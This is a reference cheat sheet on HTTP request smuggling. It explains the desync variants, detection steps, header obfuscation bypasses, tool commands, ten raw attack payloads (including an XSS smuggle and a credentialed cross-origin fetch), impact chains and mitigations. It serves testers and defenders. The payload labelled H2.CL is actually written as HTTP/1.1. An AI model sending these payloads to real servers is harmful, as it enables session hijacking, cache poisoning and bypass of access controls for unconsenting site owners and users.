## Overview (Theory)

HTTP request smuggling (also known as HTTP desync) is a vulnerability that exploits inconsistencies in how front-end (e.g., proxies, load balancers) and back-end servers parse HTTP requests, particularly when multiple requests are sent over a single TCP/TLS connection. This arises because the HTTP specification allows two ways to specify request boundaries: the `Content-Length` header (specifying body length in bytes) and the `Transfer-Encoding` header (using chunked encoding). Discrepancies can lead to "desynchronization," where one server interprets a request differently, allowing attackers to smuggle malicious requests. This can bypass security controls, access sensitive data, hijack sessions, or poison caches. Vulnerabilities are critical in multi-tier architectures and can affect HTTP/1.1, HTTP/2 downgrades, and even browser-powered scenarios.

## Exploitation Methods

### Identifying Vulnerabilities

- **Check for Front-End/Back-End Setup**: Confirm if the site uses a reverse proxy or load balancer by analyzing responses (e.g., via headers like `Server` or timing differences).
- **Timing-Based Detection**: Send requests that cause delays if desync occurs (e.g., incomplete chunked bodies). Use tools to measure response times.
  - Example: For CL.TE, send a request with `Content-Length: 4` and `Transfer-Encoding: chunked`, followed by partial body. A delay indicates the back-end is waiting.
- **Differential Responses**: Send two requests in sequence: an attack request interfering with a normal one. Check for unexpected responses (e.g., 404 from smuggled path).
  - Steps:
    1. Craft attack request (e.g., TE.CL with smuggled GET /404).
    2. Send normal request immediately after.
    3. If normal response shows errors like "Unrecognized method GPOST," desync confirmed.
- **HTTP/2 Downgrade Check**: Use `curl --http2` or OpenSSL to verify HTTP/2 support at edge. Send malformed CL/TE over HTTP/2; HTTP/1.1 errors indicate downgrade.
- **Browser-Powered (Client-Side) Desync**: Force victim's browser to send ambiguous requests via navigation/fetch/form. Test for connection reuse and impacts like cache poisoning.
- **Connection Coalescing Abuse**: Test if browsers reuse connections for subdomains with shared certs/IPs. Send cross-origin requests and check Wireshark for single TLS session.
- **h2c Smuggling (Clear-Text Upgrades)**: Send `Upgrade: h2c` over HTTP/1.1; if back-end upgrades to HTTP/2, tunnel raw frames bypassing front-end checks.

### CL.TE (Content-Length to Transfer-Encoding)

Front-end uses `Content-Length`, back-end uses `Transfer-Encoding`.

- Steps:
  1. Send request with both headers, ending body prematurely via chunked (e.g., `0\r\n\r\n`).
  2. Back-end terminates early, treating remainder as next request.
  3. Confirm with timing delay or differential (e.g., smuggled request poisons next user's response).

### TE.CL (Transfer-Encoding to Content-Length)

Front-end uses `Transfer-Encoding`, back-end uses `Content-Length`.

- Steps:
  1. Send chunked body longer than `Content-Length`.
  2. Front-end processes full chunks; back-end stops at CL, leaving excess as next request.
  3. Use Burp Repeater with "Update Content-Length" unchecked; add `\r\n\r\n` after final `0`.

### TE.TE (Transfer-Encoding Obfuscation)

Both support `Transfer-Encoding`, but obfuscate to trick one into ignoring it.

- Steps:
  1. Obfuscate TE header (e.g., add spaces, tabs, or duplicates).
  2. Falls back to CL.TE or TE.CL based on which ignores it.
  3. Test variations until desync triggers.

### H2.TE / H2.CL (HTTP/2 Downgrades)

Front-end handles HTTP/2 frames, downgrades to HTTP/1.1 for back-end.

- Steps for H2.TE:
  1. Send over HTTP/2 with TE and partial chunked body.
  2. Front-end trusts frame length; back-end waits on incomplete chunks.
- Steps for H2.CL:
  1. Send smaller CL than actual body.
  2. Back-end reads past boundary into next request.
- Confirm: Use Burp's HTTP/2 mode; test malformed requests.

### Browser-Powered Desync (Client-Side)

Abuse browser to enqueue misframed requests on shared connections.

- Constraints: Only browser-legal syntax (no custom headers/obfuscations).
- Steps:
  1. Use fetch/navigation/form to send cross-origin requests.
  2. Target reflective/caching endpoints.
  3. Test reuse: Align with high-value victim request (e.g., via JavaScript).
  4. Primitives: Path/query injection, body shaping via POST forms.
  5. Validate: Retest without reuse or use HTTP/2 nested-response check.

### Connection-State Attacks

- **First-Request Validation**: Whitelist only checked on first request; reuse connection for internal hosts.
  - Steps: Send allowed request, then internal one on same connection.
- **First-Request Routing**: Route based on first request; subsequent ignore Host.
  - Steps: Poison first (e.g., via Host header attack), smuggle to private vhost.

### Tools for Detection and Exploitation

- **smuggler.py**: `python3 smuggler.py -u <URL> -m GET/POST` or from file list.
- **Burp HTTP Request Smuggler Extension**: Scan for CL.TE/TE.CL/H2; use "Smuggle Attack" in Turbo Intruder.
- **h2csmuggler**: `go run ./cmd/h2csmuggler check https://target http://localhost`.
- **http2smugl**: Detect H2.CL/H2.TE: `http2smugl detect $URL`.
- **Manual with curl**: `curl --http2 -v -d @payload https://target`.

## Bypasses

- **TE Header Obfuscation**: Use variations to trick one server:
  - `Transfer-Encoding: xchunked`
  - `Transfer-Encoding : chunked`
  - `Transfer-Encoding: chunked\r\nTransfer-Encoding: x`
  - `Transfer-Encoding:[tab]chunked`
  - `[space]Transfer-Encoding: chunked`
  - `X: X[\n]Transfer-Encoding: chunked`
  - `Transfer-Encoding\r\n: chunked`
  - `Transfer-Encoding: chùnked`
  - `Transfer-Encoding: \x00chunked`
  - `Foo: bar\r\n\rTransfer-Encoding: chunked`
- **NULL Character Injection**: Inject `\0` in headers to prematurely end requests.
- **Huge Headers**: Use oversized headers (~65k chars) to force end-of-query.
- **Double Content-Length**: Prioritize differently between servers (rare due to RFC rejection).
- **Absolute URI Syntax**: Inject `:` in request line to mimic headers.
- **HTTP/2 Clear-Text (h2c) Upgrade**: Send `Upgrade: h2c` to tunnel HTTP/2 frames over HTTP/1.1.
- **Connection Coalescing**: Abuse browser reuse for subdomains with shared cert/IP; bypass first-request checks.

## Payloads

Here are 10 modern, robust payloads (trimmed from sources):

1. **CL.TE Basic**:
   ```
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Content-Length: 13
   Transfer-Encoding: chunked

   0

   SMUGGLED
   ```

2. **TE.CL Basic**:
   ```
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Content-Length: 3
   Transfer-Encoding: chunked

   8
   SMUGGLED
   0

   ```

3. **TE.TE Obfuscated**:
   ```
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Content-Length: 4
   Transfer-Encoding: chunked
   Transfer-encoding: cow

   5c
   GPOST / HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15

   x=1
   0
   ```

4. **H2.TE Example**:
   ```
   :method: POST
   :path: /login
   :scheme: https
   :authority: example.com
   content-length: 13
   transfer-encoding: chunked

   5;ext=1\r\nHELLO\r\n
   0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\nX: X
   ```

5. **H2.CL Example**:
   ```
   POST / HTTP/1.1
   Host: vulnerable-website.com
   Content-Length: 35
   Content-Length: 0

   GET /smuggled HTTP/1.1
   Host: vulnerable-website.com
   ```

6. **NULL Injection**:
   ```
   GET / HTTP/1.1
   Host: vulnerable-website.com
   X-Something: \0 something
   GET http://vulnerable-website.com/index.html?bar=1 HTTP/1.1
   ```

7. **Huge Header**:
   ```
   GET / HTTP/1.1
   Host: vulnerable-website.com
   X-Something: AAAAA...(65532 'A')...AAA
   GET http://vulnerable-website.com/index.html?bar=1 HTTP/1.1
   ```

8. **XSS via Smuggling**:
   ```
   POST / HTTP/1.1
   Host: unstable.com
   User-Agent: Mozilla/5.0
   Transfer-Encoding: chunked
   Content-Length: 213

   0

   GET /xss HTTP/1.1
   Host: unstable.com
   User-Agent: '"><script>alert("xss")</script>
   Content-Length: 10

   asdasd
   ```

9. **h2c Upgrade**:
   ```
   GET / HTTP/1.1
   Host: target
   Upgrade: h2c
   Connection: Upgrade

   [HTTP/2 frames follow]
   ```

10. **Browser Desync (JavaScript)**:
    ```
    fetch("//sub1.hackxor.net/", { mode: "no-cors", credentials: "include" }).then(
      () => {
        fetch("//sub2.hackxor.net/", { mode: "no-cors", credentials: "include" })
      }
    )
    ```

## Higher Impact

- **Cache Poisoning/Deception**: Smuggle responses to cache malicious content (e.g., XSS payloads) served to all users.
- **Session Hijacking/Fixation**: Steal cookies or force logout via smuggled requests.
- **Bypassing Auth/Controls**: Access admin panels or internal resources by smuggling to private vhosts.
- **XSS Amplification**: Smuggle reflected XSS in headers like User-Agent for persistent attacks.
- **Account Takeover**: Chain with password resets or session theft (e.g., via smuggled cookies).
- **DDoS**: Exploit to overwhelm back-ends with malformed requests.
- **XXE/SSRF Chaining**: Smuggle to internal endpoints for data exfil or firewall bypass.
- **Mass Takeovers**: Steal sessions across users via poisoned connections.
- **Connection Contamination**: Abuse coalescing for misrouting (e.g., WordPress XSS on secure subdomains).

## Mitigations

- **Reject Ambiguous Requests**: Enforce RFC 7230: Reject multiple/differing CL or whitespace before colon in headers.
- **Use End-to-End HTTP/2/3**: Avoid downgrades; normalize headers before routing.
- **Single Source of Length**: When downgrading, generate valid CL and strip user-supplied CL/TE.
- **Connection Isolation**: Limit reuse; one request per connection to prevent queuing.
- **Strip Upgrades**: Remove `Upgrade: h2c` except for WebSockets.
- **Avoid Wildcard Certs**: Limit coalescing by using separate certs/IPs for subdomains.
- **No First-Request Routing**: Validate/reroute every request independently.
- **Sanitize Inputs**: Normalize before processing; reject oversized/obfuscated headers.
- **Monitor Tools**: Use WAFs/proxies that detect desync (e.g., mod_proxy fixes in Apache 2.4.56+).

## References

- [Finding HTTP request smuggling vulnerabilities](https://portswigger.net/web-security/request-smuggling/finding)
- [Exploiting HTTP request smuggling vulnerabilities](https://portswigger.net/web-security/request-smuggling/exploiting)
- [HTTP Request Smuggler - Burp Suite Extension](https://github.com/PortSwigger/http-request-smuggler)
- [Regilero's smuggling researches](https://regilero.github.io/tag/Smuggling/)
- [HTTP Request Smuggling CL.TE](https://memn0ps.github.io/2019/09/13/HTTP-Request-Smuggling-CL-TE.html)
- [HAProxy HTTP request smuggling](https://nathandavison.com/blog/haproxy-http-request-smuggling)
- [Write up of two HTTP Requests Smuggling](https://medium.com/@cc1h2e1/write-up-of-two-http-requests-smuggling-ff211656fe7d)
- [Report: Password theft login.newrelic.com via Request Smuggling](https://hackerone.com/reports/498052)
- [Report: Mass account takeovers using HTTP Request Smuggling to steal session cookies](https://hackerone.com/reports/737140)
- [Write up: Account takeover via HTTP Request Smuggling](https://hipotermia.pw/bb/http-desync-account-takeover)
- [NGINX error_page request smuggling](https://bertjwregeer.keybase.pub/2019-12-10%20-%20error_page%20request%20smuggling.pdf)
- [Write up; XXE-scape through the front door: circumventing the firewall with HTTP request smuggling](https://honoki.net/2020/03/18/xxe-scape-through-the-front-door-circumventing-the-firewall-with-http-request-smuggling/)
- [Smuggling HTTP requests over fake WebSocket connection](https://github.com/0ang3el/websocket-smuggle)
- [HTTP Request Smuggling in 2020. New variants, new defenses and new challenges](https://github.com/0xn3va/cheat-sheets/blob/master/Web%20Application/HTTP%20Request%20Smuggling/materials/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf)
- [https://hackerone.com/reports/726773](https://hackerone.com/reports/726773)
- [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)
- [https://paper.seebug.org/1049/](https://paper.seebug.org/1049/)
- [Portswigger Topic](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [Portswigger Lab](https://portswigger.net/web-security/request-smuggling)
- [Report 1](https://hackerone.com/reports/737140)
- [Report 2](https://hackerone.com/reports/867952)
- [Report 3](https://hackerone.com/reports/498052)
- [Report 4](https://hackerone.com/reports/526880)
- [Report 5](https://hackerone.com/reports/771666)
- [Report 6](https://hackerone.com/reports/753939)
- [Report 7](https://hackerone.com/reports/648434)
- [Report 8](https://hackerone.com/reports/740037)
- [Article 1](https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142)
- [Article 2](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
- [Article 3](https://medium.com/@cc1h2e1/write-up-of-two-http-requests-smuggling-ff211656fe7d)
- [Article 4](https://medium.com/bugbountywriteup/crossing-the-borders-the-illegal-trade-of-http-requests-57da188520ca)
- [A Brief Video About Req. Smuggling](https://youtu.be/gzM4wWA7RFo)
- [https://blog.detectify.com/2020/05/28/hiding-in-plain-sight-http-request-smuggling/](https://blog.detectify.com/2020/05/28/hiding-in-plain-sight-http-request-smuggling/)
- [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- [https://portswigger.net/web-security/request-smuggling/browser/client-side-desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync)
- [https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling)
- [https://portswigger.net/research/http-3-connection-contamination](https://portswigger.net/research/http-3-connection-contamination)
- [https://portswigger.net/research/http2](https://portswigger.net/research/http2)
- [https://bishopfox.com/blog/h2c-smuggling-request](https://bishopfox.com/blog/h2c-smuggling-request)
- [https://defparam/smuggler](https://github.com/defparam/smuggler)
- [https://github.com/ZeddYu/HTTP-Smuggling-Lab](https://github.com/ZeddYu/HTTP-Smuggling-Lab)
- [https://github.com/gwen001/pentest-tools](https://github.com/gwen001/pentest-tools)
- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
- [https://github.com/defparam/tiscripts](https://github.com/defparam/tiscripts)
- [https://github.com/neex/http2smugl](https://github.com/neex/http2smugl)
- [https://portswigger.net/research/http1-must-die](https://portswigger.net/research/http1-must-die)
- [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- [https://www.imperva.com/learn/application-security/http-request-smuggling/](https://www.imperva.com/learn/application-security/http-request-smuggling/)
- [https://daniel.haxx.se/blog/2016/08/18/http2-connection-coalescing](https://daniel.haxx.se/blog/2016/08/18/http2-connection-coalescing)